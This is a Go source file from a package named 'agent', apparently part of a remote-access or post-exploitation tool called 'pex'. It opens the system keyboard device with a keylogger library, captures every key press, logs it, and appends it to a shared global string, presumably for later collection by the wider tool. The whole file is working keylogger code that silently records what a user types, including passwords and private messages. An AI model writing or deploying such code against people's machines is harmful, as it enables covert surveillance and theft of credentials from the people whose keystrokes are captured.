package agent

import (
	"sync"

	"github.com/MarinX/keylogger"
	logger "github.com/hardal7/pex/internal/util"
)

var mu sync.Mutex
var keysPressed string

func LogKeyboard() {
	keyboard := keylogger.FindKeyboardDevice()
	if len(keyboard) == 0 {
		keysPressed = "No keyboard found"
		return
	}
	keylog, _ := keylogger.New(keyboard)

	events := keylog.Read()
	for event := range events {
		if event.Type == keylogger.EvKey {
			if event.KeyPress() {
				logger.Debug("Key pressed: " + event.KeyString())
				mu.Lock()
				keysPressed += event.KeyString()
				mu.Unlock()
			}
		}
	}
	defer keylog.Close()
}
